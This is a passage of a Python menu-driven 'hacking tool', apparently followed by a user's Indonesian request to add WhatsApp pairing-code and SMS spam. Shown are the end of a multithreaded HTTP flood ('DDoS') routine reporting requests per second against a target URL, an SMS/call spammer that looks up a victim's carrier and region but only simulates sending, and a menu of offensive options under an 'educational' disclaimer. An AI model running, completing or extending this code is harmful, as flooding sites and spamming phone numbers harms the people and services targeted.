                print(f"\r{Colors.YELLOW}Requests sent: {requests_sent} | RPS: {requests_per_sec:.1f}", end="")
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        
        stop_flag = True
        for thread in threads:
            thread.join()
        
        total_time = time.time() - start_time
        requests_per_sec = requests_sent / total_time if total_time > 0 else 0
        
        print(f"\n\n{Colors.CYAN}=== ATTACK SUMMARY ==={Colors.RESET}")
        print(f"{Colors.WHITE}Target: {url}")
        print(f"Duration: {total_time:.1f} seconds")
        print(f"Threads: {threads_count}")
        print(f"Total requests sent: {requests_sent}")
        print(f"Requests per second: {requests_per_sec:.1f}{Colors.RESET}")
        
    except requests.exceptions.RequestException:
        print(f"{Colors.RED}[!] Could not connect to target{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

# ==================== SMS/CALL SPAMMER (EDUCATIONAL) ====================
def sms_call_spammer():
    clear_screen()
    print(f"{Colors.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}    SMS/CALL SPAMMER (FOR EDUCATIONAL PURPOSES)      {Colors.RED}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}[!] WARNING: This tool is for educational purposes only!")
    print(f"[!] Do not use this for illegal activities!{Colors.RESET}")
    
    confirm = input(f"\n{Colors.YELLOW}[?] Do you understand and agree? (y/n): {Colors.RESET}")
    if confirm.lower() != 'y':
        return
    
    phone_number = input(f"\n{Colors.YELLOW}[?] Enter phone number (with country code, e.g., +1234567890): {Colors.RESET}")
    mode = input(f"{Colors.YELLOW}[?] Choose mode (sms/call): {Colors.RESET}").lower()
    count = int(input(f"{Colors.YELLOW}[?] Number of attempts (default 5): {Colors.RESET}") or 5)
    
    if mode not in ['sms', 'call']:
        print(f"{Colors.RED}[!] Invalid mode. Please choose 'sms' or 'call'{Colors.RESET}")
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")
        return
    
    try:
        # Validate phone number
        parsed_number = phonenumbers.parse(phone_number, None)
        if not phonenumbers.is_valid_number(parsed_number):
            print(f"{Colors.RED}[!] Invalid phone number{Colors.RESET}")
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")
            return
        
        # Get carrier and location info
        carrier_name = carrier.name_for_number(parsed_number, "en") or "Unknown"
        region = geocoder.description_for_number(parsed_number, "en") or "Unknown"
        time_zones = timezone.time_zones_for_number(parsed_number)
        time_zone = time_zones[0] if time_zones else "Unknown"
        
        formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        
        print(f"\n{Colors.CYAN}=== PHONE INFORMATION ==={Colors.RESET}")
        print(f"{Colors.WHITE}Number: {formatted_number}")
        print(f"Carrier: {carrier_name}")
        print(f"Region: {region}")
        print(f"Time Zone: {time_zone}{Colors.RESET}")
        
        Loading.dots(f"Preparing {mode} spam", 2)
        
        print(f"\n{Colors.RED}[!] SIMULATING {mode.upper()} SPAM (NOT ACTUALLY SENDING){Colors.RESET}")
        
        for i in range(1, count + 1):
            time.sleep(0.5)
            if mode == 'sms':
                print(f"{Colors.YELLOW}[{i}] Sending SMS to {formatted_number}...{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}[{i}] Making call to {formatted_number}...{Colors.RESET}")
        
        print(f"\n{Colors.CYAN}=== SPAM SUMMARY ==={Colors.RESET}")
        print(f"{Colors.WHITE}Target: {formatted_number}")
        print(f"Mode: {mode}")
        print(f"Attempts: {count}")
        print(f"Carrier: {carrier_name}")
        print(f"Region: {region}{Colors.RESET}")
        
    except phonenumbers.phonenumberutil.NumberParseException:
        print(f"{Colors.RED}[!] Invalid phone number format. Include country code (e.g., +1234567890){Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

# ==================== ABOUT ====================
def about():
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                         ABOUT                        {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    print(f"""
{Colors.WHITE}Python Hacking Tool v4.0

This is an educational tool designed to demonstrate various 
information gathering and security testing techniques.

{Colors.YELLOW}Features:{Colors.WHITE}
- Information Gathering (WHOIS, DNS, GeoIP)
- Network Scanning (Port Scanner, Ping Sweep)
- Web Security Tools (Directory Brute Force, Admin Finder)
- Educational Simulations (DDoS, SMS/Call Spam)

{Colors.RED}Disclaimer:{Colors.WHITE}
This tool is for educational purposes only. The developers 
are not responsible for any misuse of this software.

{Colors.CYAN}Created by: Security Researchers
License: Educational Use Only{Colors.RESET}
""")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

# ==================== MAIN FUNCTION ====================
def main():
    try:
        # Check dependencies
        try:
            Loading.spinner("Checking dependencies...", 1)
            subprocess.run(['whois', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['ping', '-c', '1', '127.0.0.1'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['curl', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Check Python modules
            import dns.resolver
            import phonenumbers
            import requests
            from bs4 import BeautifulSoup
        except FileNotFoundError as e:
            print(f"{Colors.RED}[!] Missing system dependency: {str(e)}{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] On Debian/Ubuntu, run: sudo apt install whois iputils-ping curl{Colors.RESET}")
            sys.exit(1)
        except ImportError as e:
            print(f"{Colors.RED}[!] Missing Python module: {str(e)}{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Install with: pip install dnspython phonenumbers requests beautifulsoup4{Colors.RESET}")
            sys.exit(1)
            
        while True:
            print_banner()
            print_menu()
            choice = input(f"{Colors.YELLOW}[?] Select option (1-10): {Colors.RESET}")

            if choice == '1':
                information_gathering_menu()
            elif choice == '2':
                port_scanner()
            elif choice == '3':
                ping_sweep()
            elif choice == '4':
                directory_brute_forcer()
            elif choice == '5':
                website_info()
            elif choice == '6':
                admin_panel_finder()
            elif choice == '7':
                ddos_web()
            elif choice == '8':
                sms_call_spammer()
            elif choice == '9':
                about()
            elif choice == '10':
                Loading.color("Exiting...", 1)
                sys.exit(0)
            else:
                print(f"\n{Colors.RED}[!] Invalid choice{Colors.RESET}")
                time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program terminated by user{Colors.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Unexpected error: {str(e)}{Colors.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()


TAMBAHIN SPAM PAIRING CODE WHATSAPP DAN SPAM SMS WHATSAPP
